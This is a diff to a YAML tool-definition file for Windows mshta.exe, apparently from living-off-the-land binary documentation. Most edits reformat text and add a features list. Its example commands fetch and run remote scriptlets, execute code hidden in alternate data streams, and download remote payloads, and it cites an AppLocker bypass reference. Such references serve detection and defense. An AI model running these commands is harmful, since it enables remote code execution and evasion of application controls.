@@ -2,7 +2,8 @@
 id: windows-execution-mshta
 namespace: windows:execution:mshta
 name: mshta
-description: 'Used by Windows to execute html applications. (.hta) Located at: C:\Windows\System32\mshta.exe; C:\Windows\SysWOW64\mshta.exe.'
+description: 'Used by Windows to execute html applications. (.hta) Located at: C:\Windows\System32\mshta.exe;
+  C:\Windows\SysWOW64\mshta.exe.'
 author: Oddvar Moe
 version: 1.0.0
 capabilities:
@@ -45,7 +46,14 @@ resource_profile:
 allowed-tools:
 - mshta
 parameters: []
-features: []
+features:
+- file-system
+- local
+- network-intensive
+- pipes-stdin
+- pipes-stdout
+- process-manip
+- streaming
 execution:
   template: mshta
   sandbox: execFile
@@ -53,15 +61,18 @@ execution:
   shell: false
 global_vars: {}
 examples:
-- description: Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript. (Execute code)
+- description: Opens the target .HTA and executes embedded JavaScript, JScript, or
+    VBScript. (Execute code)
   command: mshta.exe {PATH:.hta}
 - description: Executes VBScript supplied as a command line argument. (Execute code)
   command: mshta.exe vbscript:Close(Execute("GetObject(""script:{REMOTEURL:.sct}"")"))
 - description: Executes JavaScript supplied as a command line argument. (Execute code)
   command: mshta.exe javascript:a=GetObject("script:{REMOTEURL:.sct}").Exec();close();
-- description: Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript. (Execute code hidden in alternate data stream)
+- description: Opens the target .HTA and executes embedded JavaScript, JScript, or
+    VBScript. (Execute code hidden in alternate data stream)
   command: mshta.exe "{PATH_ABSOLUTE}:file.hta"
-- description: It will download a remote payload and place it in INetCache. (Downloads payload from remote server)
+- description: It will download a remote payload and place it in INetCache. (Downloads
+    payload from remote server)
   command: mshta.exe {REMOTEURL}
 references:
 - label: AppLocker_Bypass_Techniques.html#menu_index_4
@@ -126,7 +137,6 @@ install:
   commands:
   - choco install mshta
 ---
-
 
 # mshta
 
